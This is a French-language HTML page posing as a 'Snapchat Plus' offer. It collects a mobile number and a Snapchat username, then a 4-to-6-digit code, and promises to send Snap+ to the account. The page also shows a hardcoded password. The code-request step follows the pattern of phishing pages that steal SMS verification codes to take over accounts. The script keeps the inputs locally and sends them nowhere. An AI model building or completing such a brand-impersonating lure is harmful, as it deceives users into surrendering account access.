

<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8" />
    <title>Snapchat Plus</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #fff77a; /* Couleur de fond jaune */
            height: 100vh;
            margin: 0;
            overflow: hidden;
            display: flex;
            justify-content: center;
            align-items: center;
            position: relative;
        }

        .carre {
            background: white;
            padding: 2em;
            border-radius: 12px;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.2);
            width: 90%;
            max-width: 400px;
            text-align: center;
            z-index: 2;
        }

        h2 {
            margin-bottom: 0.5em;
        }

        #messageLibre {
            font-size: 1em;
            margin-bottom: 1.5em;
            color: #333;
        }

        input {
            width: 90%;
            padding: 0.7em;
            margin: 1em auto;
            font-size: 1em;
            border: 2px solid #ccc;
            border-radius: 6px;
            display: block;
        }

        button {
            padding: 0.7em 1.2em;
            font-size: 1em;
            background: #0056b3;
            color: white;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            margin-top: 0.5em;
        }

        button:hover {
            background: #003d80;
        }

        .error {
            color: red;
            font-weight: bold;
            margin-top: 1em;
        }

        .success {
            color: green;
            font-weight: bold;
            margin-top: 1em;
            font-size: 1.2em;
        }

        #passwordDisplay {
            font-size: 1.2em;
            margin-top: 1em;
            color: #333;
            display: none; /* Caché par défaut */
        }
    </style>
</head>
<body>

    <div class="carre">
        <h2>Snapchat Plus</h2>
        <div id="messageLibre">⚠️ Si vous êtes chez l'opérateur Free, cela peut ne pas fonctionner correctement (bug réseau).</div>

        <div id="formulaire">
            <input type="text" id="phone" placeholder="06XXXXXXXX" maxlength="10" />
            <input type="text" id="pseudo" placeholder="Votre pseudo Snap" maxlength="20" />
            <button onclick="validerNumPseudo()">Suivant</button>
            <div id="msgForm" class="error"></div>
        </div>

        <div id="infosUser" style="display:none;">
            <p><strong>Numéro :</strong> <span id="affichePhone"></span></p>
            <p><strong>Pseudo Snap :</strong> <span id="affichePseudo"></span></p>

            <input type="text" id="code" placeholder="Entrez votre code (4 à 6 chiffres)" maxlength="6" />
            <button onclick="validerCode()">Valider le code</button>
            <div id="msgCode" class="error"></div>
            <div id="confirmation" class="success" style="display:none;">
                ✅ Votre Snap+ va être envoyé sur votre compte.
            </div>
            <div id="passwordDisplay">Mot de passe : ans77z</div> <!-- Affichage du mot de passe -->
        </div>
    </div>

    <script>
        let currentUser = {};

        function validerNumPseudo() {
            const phone = document.getElementById('phone').value.trim();
            const pseudo = document.getElementById('pseudo').value.trim();
            const msg = document.getElementById('msgForm');
            msg.textContent = "";

            if (!/^0[67]\d{8}$/.test(phone)) {
                msg.textContent = "❌ Numéro invalide. Format attendu : 06XXXXXXXX";
                return;
            }

            if (pseudo.length < 3) {
                msg.textContent = "❌ Pseudo trop court.";
                return;
            }

            currentUser.phone = phone;
            currentUser.pseudo = pseudo;

            document.getElementById('formulaire').style.display = 'none';
            document.getElementById('infosUser').style.display = 'block';
            document.getElementById('affichePhone').textContent = phone;
            document.getElementById('affichePseudo').textContent = pseudo;
            document.getElementById('msgCode').textContent = "";
            document.getElementById('confirmation').style.display = "none";
            document.getElementById('passwordDisplay').style.display = "block"; // Affiche le mot de passe
            document.getElementById('code').value = "";
        }

        function validerCode() {
            const codeInput = document.getElementById('code');
            const code = codeInput.value.trim();
            const msg = document.getElementById('msgCode');
            const conf = document.getElementById('confirmation');
            msg.textContent = "";
            conf.style.display = "none";

            if (!/^\d{4,6}$/.test(code)) {
                msg.textContent = "❌ Code invalide (4 à 6 chiffres).";
                return;
            }

            currentUser.code = code;
            conf.style.display = "block";
            codeInput.value = "";
        }
    </script>

</body>
</html>


